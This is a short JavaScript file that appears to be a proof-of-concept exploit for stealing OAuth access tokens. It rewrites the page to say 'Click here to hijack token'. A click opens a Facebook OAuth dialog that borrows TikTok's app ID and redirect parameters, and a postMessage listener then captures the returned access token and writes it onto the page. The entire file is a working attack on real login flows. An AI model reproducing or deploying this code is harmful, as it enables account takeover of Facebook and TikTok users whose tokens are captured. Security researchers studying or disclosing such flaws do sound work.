document.body.innerHTML = '<h5>Click here to hijack token<h5>';

var loading; // Declare 'loading' variable in a broader scope

function handleOnClick() {
  // Open the first URL and close the new tab after 10 seconds
  var newTab = window.open('https://www.facebook.com/v18.0/dialog/oauth?app_id=1862952583919182&cbt=1699807270255&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3b4140b60baef8%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff3e261e93d4917%26relation%3Dopener&client_id=1862952583919182&display=popup&domain=www.tiktok.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.tiktok.com%2Fforyou%3Flang%3Den&locale=en_US&logger_id=f39d67fd5f48ee8&origin=1&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df37c8c85f9286ec%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ff3e261e93d4917%26relation%3Dopener%26frame%3Df32fbc9cc4f6394&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v18.0');
  setTimeout(function() {
    newTab.close();
  }, 1000000000);
}

window.addEventListener('message', function(event) {
    console.log(event.data);

    // Check if event.data starts with "cb="
    if (typeof event.data === 'string' && event.data.startsWith('cb=')) {
        document.write(`Your Access Token: ${event.data}`);
    } else {
        console.error('Invalid data format or missing "cb=" prefix');
    }
}, false);
  
// Attach click event listener to the window object
window.onclick = handleOnClick;
